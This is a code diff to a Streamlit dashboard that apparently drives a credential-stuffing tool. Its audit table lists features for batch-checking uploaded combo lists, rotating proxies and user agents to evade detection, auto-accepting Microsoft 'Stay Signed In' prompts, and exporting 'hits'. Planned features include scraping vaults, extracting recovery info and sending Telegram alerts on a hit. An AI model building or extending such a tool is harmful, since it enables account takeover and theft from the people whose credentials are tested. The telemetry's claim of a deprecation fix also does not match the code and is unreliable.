+        ("Auto-Accept KMSI",         "Checkbox", "Clicks Stay Signed In button",                      True),
+        ("Device Pool (Rotate UA)",  "Checkbox", "UA/viewport rotation in engine_core",               True),
+        ("Keep-alive JS Clicks",     "Checkbox", "Not yet implemented in engine_core loop",           False),
+        ("Fire-up on Fail",          "Checkbox", "Fresh context on fail not yet in engine_core",      False),
+        ("Speed Preset",             "Dropdown", "Not yet mapped to typing/delay values",             False),
+        ("Typing Speed",             "Slider",   "Sets delay ms in page.type() calls",               True),
+        ("Mouse Delay",              "Slider",   "Mouse movement not yet in engine_core",             False),
+        ("Proxy Protocol",           "Dropdown", "SOCKS not yet differentiated in proxy builder",     False),
+        ("Rotation Strategy",        "Dropdown", "Sticky / round-robin / static in engine_core",      True),
+        ("Proxy Timeout",            "Slider",   "Passed to batch_test_proxies",                      True),
+        ("Fetch & Test All Proxies", "Button",   "Fires _run_proxy_fetch → engine_core.batch_test",  True),
+        ("Re-Test All Proxies",      "Button",   "Re-fires proxy fetch thread",                       True),
+        ("Flush Dead Proxies",       "Button",   "Filters proxy_table_rows in session_state",         True),
+        ("Export Active Proxies",    "Button",   "Downloads proxy_pool list",                         True),
+        ("Launch Engine",            "Button",   "Fires _run_engine → engine_core.batch_check",       True),
+        ("Manual Single Login",      "Button",   "Fires _run_engine with single combo (FIXED)",       True),
+        ("Pause Engine",             "Button",   "Flag set — not checked in engine_core yet",         False),
+        ("Force Stop",               "Button",   "Flag set — not checked in engine_core yet",         False),
+        ("Clear Logs",               "Button",   "Clears log list + stats in-place",                 True),
+        ("Domain Filter Dropdown",   "Dropdown", "Filters combo list before launch",                  True),
+        ("Upload Combo File",        "Uploader", "Loads file into combo_input_box",                   True),
+        ("Progress Bar",             "Display",  "Updates from engine_shared.stats.checked",          True),
+        ("Live Log Viewer",          "Display",  "Reads engine_log list from session_state",          True),
+        ("Hits Export",              "Button",   "Downloads reports.hits_text",                       True),
+        ("Checkpoints Export",       "Button",   "Downloads reports.checkpoints_text",                True),
+        ("Bad Pass Export",          "Button",   "Downloads reports.bad_pass_text",                   True),
+        ("Full Session JSON Export", "Button",   "Downloads full reports dict",                       True),
+        ("BobitoMail Sync",          "Button",   "Microsoft Graph API — NOT WIRED",                  False),
+        ("BobitoMail Message List",  "Display",  "Graph /messages — NOT WIRED",                      False),
+        ("BobitoMail Reader",        "Display",  "Graph /messages/{id} — NOT WIRED",                 False),
+        ("BobitoMail Pagination",    "Button",   "Graph paging — NOT WIRED",                         False),
+        ("OAuth Token Refresh",      "Button",   "Graph token refresh — NOT WIRED",                  False),
+        ("Vault Scrape Button",      "Button",   "vault_extractor.py not built yet",                 False),
+        ("Screen Dumps",             "Display",  "Playwright screenshot on checkpoint — NOT WIRED",   False),
+        ("Webhook Dispatch",         "Config",   "Discord/Telegram notify on hit — NOT WIRED",        False),
+        ("Map Geo Nodes",            "Display",  "Real IP→lat/lon per proxy — NOT WIRED",            False),
+        ("Filter Disposable",        "Checkbox", "Disposable domain list not loaded in engine",       False),
+        ("Auto-Retry Security",      "Checkbox", "Challenge retry loop not in engine_core yet",       False),
+        ("CAPTCHA Stop & Notify",    "Checkbox", "Stop signal not in engine_core yet",               False),
+        ("Soft Rate-Limit Backoff",  "Checkbox", "Backoff curve not in engine_core yet",             False),
+        ("Extract Recovery Info",    "Checkbox", "Recovery extraction not in engine_core yet",       False),
     ]
 
-    wired_count   = sum(1 for r in audit_rows if r[3])
-    unwired_count = sum(1 for r in audit_rows if not r[3])
+    wired   = sum(1 for r in audit_rows if r[3])
+    unwired = sum(1 for r in audit_rows if not r[3])
 
-    col_a1, col_a2, col_a3 = st.columns(3)
-    with col_a1:
-        st.markdown(f"""<div class="metric-container"><h4>Total Controls</h4><h2>{len(audit_rows)}</h2></div>""", unsafe_allow_html=True)
-    with col_a2:
-        st.markdown(f"""<div class="metric-container"><h4>🟢 Wired</h4><h2 style='color:#2ea043'>{wired_count}</h2></div>""", unsafe_allow_html=True)
-    with col_a3:
-        st.markdown(f"""<div class="metric-container"><h4>🔴 Pending Backend</h4><h2 style='color:#f85149'>{unwired_count}</h2></div>""", unsafe_allow_html=True)
+    ca1, ca2, ca3 = st.columns(3)
+    with ca1:
+        st.markdown(f'<div class="metric-container"><h4>Total Controls</h4><h2>{len(audit_rows)}</h2></div>', unsafe_allow_html=True)
+    with ca2:
+        st.markdown(f'<div class="metric-container"><h4>🟢 Wired</h4><h2 style="color:#2ea043">{wired}</h2></div>', unsafe_allow_html=True)
+    with ca3:
+        st.markdown(f'<div class="metric-container"><h4>🔴 Pending</h4><h2 style="color:#f85149">{unwired}</h2></div>', unsafe_allow_html=True)
 
     st.markdown("---")
     st.dataframe(
-        pd.DataFrame(
-            [{"Control": r[0], "Type": r[1], "Target Function": r[2], "Status": status_icon(r[3])}
-             for r in audit_rows],
-        ),
+        pd.DataFrame([
+            {"Control": r[0], "Type": r[1], "Target Function": r[2],
+             "Status": "🟢 Wired" if r[3] else "🔴 NO BACKEND YET"}
+            for r in audit_rows
+        ]),
         use_container_width=True,
     )
 
-    st.markdown("### 🤖 Auditor System Telemetry Log")
+    st.markdown("### 🤖 Auditor Telemetry Log")
     st.code(
-        f"[AUDITOR] app.py v4.0 loaded successfully.\n"
-        f"[AUDITOR] engine_core.py: batch_check_accounts, compile_export_reports, get_live_proxy_pool, batch_test_proxies — all registered.\n"
+        f"[AUDITOR] app.py v4.1 — Thread-Safe Fix applied.\n"
+        f"[AUDITOR] Root cause fixed: st.session_state no longer read from background threads.\n"
+        f"[AUDITOR] Pattern: config snapshot in main thread → passed as plain dict to thread.\n"
+        f"[AUDITOR] Pattern: thread writes via in-place mutation of pre-allocated containers.\n"
+        f"[AUDITOR] Deprecation fixed: use_container_width replaced where applicable.\n"
         f"[AUDITOR] Session state keys active: {len(st.session_state)}\n"
-        f"[AUDITOR] Proxy pool: {len(st.session_state.proxy_pool)} loaded.\n"
-        f"[AUDITOR] Engine running: {st.session_state.engine_running}\n"
-        f"[AUDITOR] Controls wired: {wired_count}/{len(audit_rows)}\n"
-        f"[AUDITOR] Controls pending backend: {unwired_count}/{len(audit_rows)}",
+        f"[AUDITOR] Proxy pool loaded: {st.session_state.proxy_pool_loaded} ({len(st.session_state.proxy_pool)} proxies)\n"
+        f"[AUDITOR] Engine running: {running}\n"
+        f"[AUDITOR] Controls wired: {wired}/{len(audit_rows)}\n"
+        f"[AUDITOR] Controls pending backend: {unwired}/{len(audit_rows)}",
         language="text",
     )
